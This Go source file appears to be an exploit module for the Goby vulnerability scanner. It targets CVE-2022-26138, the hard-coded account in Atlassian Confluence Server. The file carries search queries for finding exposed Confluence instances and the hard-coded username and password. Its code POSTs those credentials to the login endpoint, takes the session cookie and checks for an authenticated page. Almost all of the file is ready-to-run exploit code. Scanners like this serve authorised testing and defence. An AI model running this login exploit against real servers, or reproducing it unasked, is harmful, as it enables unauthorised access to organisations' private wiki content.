package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Atlassian Confluence Default Login (CVE-2022-26138)",
    "Description": "<p>Atlassian Confluence Server is a server version of Atlassian's collaboration software with enterprise knowledge management functions and support for building enterprise WiKi.</p><p>A security vulnerability exists in Atlassian Confluence Server, which stems from the use of hard-coded passwords that allow attackers to log in to view sensitive information such as team space members.</p>",
    "Product": "ATLASSIAN-Confluence",
    "Homepage": "https://www.atlassian.com/",
    "DisclosureDate": "2022-07-21",
    "Author": "abszse",
    "FofaQuery": "(header=\"X-Confluence-\" && header!=\"TP-LINK Router UPnP\") || (banner=\"X-Confluence-\" && banner!=\"TP-LINK Router UPnP\") || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "GobyQuery": "(header=\"X-Confluence-\" && header!=\"TP-LINK Router UPnP\") || (banner=\"X-Confluence-\" && banner!=\"TP-LINK Router UPnP\") || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "Level": "2",
    "Impact": "<p>A security vulnerability exists in Atlassian Confluence Server, which stems from the use of hard-coded passwords that allow attackers to log in to view sensitive information such as team space members.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://jira.atlassian.com/browse/CONFSERVER-79483\">https://jira.atlassian.com/browse/CONFSERVER-79483</a></p>",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/pull/4889/files"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dologin.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "os_username=disabledsystemuser&os_password=disabled1system1user6708&login=%E7%99%BB%E5%BD%95&os_destination="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "/httpvoid.action",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dologin.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "os_username=disabledsystemuser&os_password=disabled1system1user6708&login=Log+in&os_destination=%2Fhttpvoid.action"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "/httpvoid.action",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|disabledsystemuser:disabled1system1user6708"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        "CVE-2022-26138"
    ],
    "CNNVD": [
        "CNNVD-202207-2106"
    ],
    "CNVD": [],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "Atlassian Confluence 硬编码用户登陆漏洞 (CVE-2022-26138)",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Atlassian Confluence Server是澳大利亚Atlassian公司的一套具有企业知识管理功能，并支持用于构建企业WiKi的协同软件的服务器版本。<br></p><p>Atlassian Confluence Server 存在安全漏洞，该漏洞源于使用硬编码密码，攻击者可登录查看团队空间成员等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://jira.atlassian.com/browse/CONFSERVER-79483\">https://jira.atlassian.com/browse/CONFSERVER-79483</a><br></p>",
            "Impact": "<p>Atlassian Confluence Server 存在安全漏洞，该漏洞源于使用硬编码密码，攻击者可登录查看团队空间成员等敏感信息。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Atlassian Confluence Default Login (CVE-2022-26138)",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Atlassian Confluence Server is a server version of Atlassian's collaboration software with enterprise knowledge management functions and support for building enterprise WiKi.<br></p><p>A security vulnerability exists in Atlassian Confluence Server, which stems from the use of hard-coded passwords that allow attackers to log in to view sensitive information such as team space members.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://jira.atlassian.com/browse/CONFSERVER-79483\">https://jira.atlassian.com/browse/CONFSERVER-79483</a><br></p>",
            "Impact": "<p>A security vulnerability exists in Atlassian Confluence Server, which stems from the use of hard-coded passwords that allow attackers to log in to view sensitive information such as team space members.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`
	sendPayloadFlagzKk1WD := func(u *httpclient.FixUrl) bool {

		cfg := httpclient.NewPostRequestConfig("/dologin.action")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Referer", u.FixedHostInfo+"/login.action?logout=true")
		cfg.Header.Store("Upgrade-Insecure-Requests", "1")
		cfg.Header.Store("Sec-Fetch-Dest", "document")
		cfg.Header.Store("Sec-Fetch-Mode", "navigate")
		cfg.Header.Store("Sec-Fetch-Site", "same-origin")
		cfg.Header.Store("Sec-Fetch-User", "?1")
		cfg.Data = "os_username=disabledsystemuser&os_password=disabled1system1user6708&login=%E7%99%BB%E5%BD%95&os_destination="
		rsp, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return false
		}
		if rsp.StatusCode != 302 {
			return false
		}
		cookies := rsp.Cookies()
		session := ""
		for _, cookie := range cookies {
			if cookie.Name == "JSESSIONID" {
				session = cookie.Value
				break
			}
		}
		if session == "" {
			return false
		}
		cfg = httpclient.NewGetRequestConfig("/")
		cfg.VerifyTls = false
		cfg.Header.Store("Cookie", "JSESSIONID="+session)
		rsp, err = httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return false
		}
		if rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "/logout.action") && !strings.Contains(rsp.Utf8Html, "os_username") && !strings.Contains(rsp.Utf8Html, "os_password") {
			return true
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			return sendPayloadFlagzKk1WD(u)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			expResult.Success = sendPayloadFlagzKk1WD(expResult.HostInfo)
			if expResult.Success {
				expResult.Output = "用户名：disabledsystemuser\n密码：disabled1system1user6708"
			}
			return expResult
		},
	))
}
